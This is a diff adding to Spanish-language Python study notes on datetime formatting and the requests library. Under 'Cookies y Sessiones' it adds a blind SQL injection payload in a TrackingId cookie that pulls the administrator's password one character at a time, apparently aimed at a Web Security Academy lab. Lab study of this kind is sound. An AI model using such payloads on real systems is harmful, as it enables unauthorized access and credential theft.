@@ -16,6 +16,8 @@ Fijate como se crea una lista el codigo comentado es lo mismo que el de abajo de
 
 ## Python Get Current time
 
+Para obtener la fecha y hora existen varios metodos pero el que estoy estudiando es este:
+
 ```python
 
 from datetime import datetime
@@ -33,6 +35,36 @@ current_time = now.strftime("%m-%d-%Y (%H:%M:%S)")
 
 ```
 
+## Python requests
+
+Libreria que sirve para hacer peticiones la respuesta se tiene que trasformar a texto para porderla leer 
+
+```python
+import requests
+
+response = requests.get("https://raw.githubusercontent.com/something")
+data = response.text
+
+
+```
+
+### Cookies y Sessiones
+
+```python
+import requests
+
+main_url="https://0ad500f40378426ec0e710a000e1005f.web-security-academy.net"
+
+			cookies = {
+
+				'TrackingId': "USt7UKseU00I52be' and (select substring(password,%d,1) from users where username='administrator')='%s" % (position,character),
+				'session': 'S1AqgdciZYIY6zutQrKkUQqmiUShSTmA'
+			}
+
+			
+			r= requests.get(main_url,cookies=cookies)
+
+```
 
 
 
